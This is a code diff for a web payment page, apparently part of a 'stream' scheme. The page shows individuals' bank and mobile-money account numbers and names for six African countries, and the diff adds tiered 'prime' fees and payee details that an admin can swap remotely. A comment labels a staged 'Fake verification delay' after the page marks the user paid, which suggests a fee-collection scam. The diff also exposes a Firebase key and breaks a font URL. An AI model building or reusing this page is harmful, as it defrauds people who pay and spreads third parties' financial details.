@@ -7,7 +7,7 @@
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;700;800&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght=300;400;600;700;800&display=swap');
         
         :root { 
             --stream-green: #b8d5b0; 
@@ -213,8 +213,8 @@
 
 <script type="module">
     import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
-    import { getAuth } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
-    import { getFirestore, doc, onSnapshot, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
+    import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+    import { getFirestore, doc, onSnapshot, getDoc, updateDoc } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
     const firebaseConfig = {
         apiKey: "AIzaSyASDlQQMoXCeMZKs5O3KmO8zuFztt8rg2E",
@@ -230,38 +230,117 @@
     const db = getFirestore(app);
 
     const streamData = {
-        "uganda": { name: "Uganda", bank: "Airtel Uganda", number: "0708771078", holder: "ARINDA WINFRED", amount: "65,000 UGX" },
-        "south_africa": { name: "South Africa", bank: "STANDARD BANK", number: "10247413028", holder: "E K Dlamini", amount: "R350" },
-        "nigeria": { name: "Nigeria", bank: "Kuda", number: "3003439402", holder: "MORRISH M ENTERPRISE", amount: "₦15,000" },
-        "ghana": { name: "Ghana", bank: "MTN Mobile Money", number: "0534550779", holder: "Kingsley Annor", amount: "200 GHS" },
-        "cameroon": { name: "Cameroon", bank: "MTN Mobile money", number: "670312294", holder: "MARGARET NUYIN", amount: "12,000 XAF" },
-        "kenya": { name: "Kenya", bank: "MPESA", number: "0702552808", holder: "Rose Cherono", amount: "2,800 KSH" }
+        "uganda": { name: "Uganda", bank: "Airtel Uganda", number: "0708771078", holder: "ARINDA WINFRED", amount: "65,000 UGX", primeAmount: "85,000 UGX" },
+        "south_africa": { name: "South Africa", bank: "STANDARD BANK", number: "10247413028", holder: "E K Dlamini", amount: "R350", primeAmount: "R480" },
+        "nigeria": { name: "Nigeria", bank: "Kuda", number: "3003439402", holder: "MORRISH M ENTERPRISE", amount: "₦15,000", primeAmount: "₦20,000" },
+        "ghana": { name: "Ghana", bank: "MTN Mobile Money", number: "0534550779", holder: "Kingsley Annor", amount: "200 GHS", primeAmount: "280 GHS" },
+        "cameroon": { name: "Cameroon", bank: "MTN Mobile money", number: "670312294", holder: "MARGARET NUYIN", amount: "12,000 XAF", primeAmount: "16,000 XAF" },
+        "kenya": { name: "Kenya", bank: "MPESA", number: "0702552808", holder: "Rose Cherono", amount: "2,800 KSH", primeAmount: "3,800 KSH" }
     };
 
-    function setupUI(adminData = null) {
-        const selected = localStorage.getItem('selected_country') || 'nigeria';
-        const data = streamData[selected];
-        
-        if (data) {
-            document.getElementById('country-name-label').innerText = data.name;
-            document.getElementById('bank-name-display').innerText = data.bank;
-            document.getElementById('db-number').innerText = data.number;
-            document.getElementById('account-name-display').innerText = data.holder;
-            document.getElementById('display-amount').innerText = data.amount;
+    let cachedAdminData = null;
+    let cachedUserData = null;
 
-            if(selected === 'nigeria' && adminData) {
-                if(adminData.nigeriaBank) document.getElementById('bank-name-display').innerText = adminData.nigeriaBank;
-                if(adminData.nigeriaNumber) document.getElementById('db-number').innerText = adminData.nigeriaNumber;
-                if(adminData.nigeriaHolder) document.getElementById('account-name-display').innerText = adminData.nigeriaHolder;
-                if(adminData.nigeriaAmount) document.getElementById('display-amount').innerText = adminData.nigeriaAmount;
+    function getURLParameters() {
+        const urlParams = new URLSearchParams(window.location.search);
+        return {
+            amount: urlParams.get('amount'),
+            plan: urlParams.get('plan')
+        };
+    }
+
+    function setupUI() {
+        const selected = localStorage.getItem('selected_country') || 'nigeria';
+        const data = streamData[selected] || streamData["nigeria"];
+        const { amount: paramAmount, plan: paramPlan } = getURLParameters();
+
+        // Determine plan type from URL parameter or user database document
+        let activePlan = paramPlan;
+        if (!activePlan && cachedUserData) {
+            activePlan = cachedUserData.plan || cachedUserData.selectedPlan;
+        }
+        if (!activePlan) activePlan = 'regular';
+        activePlan = activePlan.toLowerCase();
+
+        // Standard details setup
+        let bankName = data.bank;
+        let accountNumber = data.number;
+        let accountHolder = data.holder;
+        let finalAmountDisplay = (activePlan === 'prime' && data.primeAmount) ? data.primeAmount : data.amount;
+
+        // If URL parameter explicitly passes an amount value, format and apply it
+        if (paramAmount) {
+            const numVal = parseFloat(paramAmount);
+            if (!isNaN(numVal)) {
+                finalAmountDisplay = (selected === 'nigeria') ? `₦${numVal.toLocaleString()}` : `${numVal.toLocaleString()}`;
+            } else {
+                finalAmountDisplay = paramAmount;
             }
         }
+
+        // Apply admin dynamic overrides from Firestore (`configs/main`)
+        if (cachedAdminData) {
+            if (selected === 'nigeria') {
+                if (cachedAdminData.nigeriaBank) bankName = cachedAdminData.nigeriaBank;
+                if (cachedAdminData.nigeriaNumber) accountNumber = cachedAdminData.nigeriaNumber;
+                if (cachedAdminData.nigeriaHolder) accountHolder = cachedAdminData.nigeriaHolder;
+
+                if (activePlan === 'prime') {
+                    if (cachedAdminData.nigeriaPrimeAmount) {
+                        finalAmountDisplay = cachedAdminData.nigeriaPrimeAmount;
+                    } else if (cachedAdminData.nigeriaAmount && !paramAmount) {
+                        finalAmountDisplay = cachedAdminData.nigeriaAmount;
+                    }
+                } else {
+                    if (cachedAdminData.nigeriaAmount) {
+                        finalAmountDisplay = cachedAdminData.nigeriaAmount;
+                    }
+                }
+            } else {
+                if (cachedAdminData[`${selected}Bank`]) bankName = cachedAdminData[`${selected}Bank`];
+                if (cachedAdminData[`${selected}Number`]) accountNumber = cachedAdminData[`${selected}Number`];
+                if (cachedAdminData[`${selected}Holder`]) accountHolder = cachedAdminData[`${selected}Holder`];
+
+                if (activePlan === 'prime' && cachedAdminData[`${selected}PrimeAmount`]) {
+                    finalAmountDisplay = cachedAdminData[`${selected}PrimeAmount`];
+                } else if (cachedAdminData[`${selected}Amount`]) {
+                    finalAmountDisplay = cachedAdminData[`${selected}Amount`];
+                }
+            }
+        }
+
+        // Update DOM elements
+        if (document.getElementById('country-name-label')) document.getElementById('country-name-label').innerText = data.name;
+        if (document.getElementById('bank-name-display')) document.getElementById('bank-name-display').innerText = bankName;
+        if (document.getElementById('db-number')) document.getElementById('db-number').innerText = accountNumber;
+        if (document.getElementById('account-name-display')) document.getElementById('account-name-display').innerText = accountHolder;
+        if (document.getElementById('display-amount')) document.getElementById('display-amount').innerText = finalAmountDisplay;
     }
 
     async function initPage() {
         setupUI();
+
+        // Listen for logged in user document
+        onAuthStateChanged(auth, async (user) => {
+            if (user) {
+                try {
+                    const userDoc = await getDoc(doc(db, "users", user.uid));
+                    if (userDoc.exists()) {
+                        cachedUserData = userDoc.data();
+                        setupUI();
+                    }
+                } catch (e) {
+                    console.error("Error retrieving user document:", e);
+                }
+            }
+        });
+
+        // Dynamic Real-time sync with Admin Dashboard config
         onSnapshot(doc(db, "configs", "main"), (snap) => {
-            if(snap.exists()) setupUI(snap.data());
+            if (snap.exists()) {
+                cachedAdminData = snap.data();
+                setupUI();
+            }
         });
     }
 
@@ -292,7 +371,8 @@
             // Write "paid" to database first
             const userRef = doc(db, "users", user.uid);
             await updateDoc(userRef, {
-                status: "paid"
+                status: "paid",
+                paidStatus: true
             });
 
             // Fake verification delay
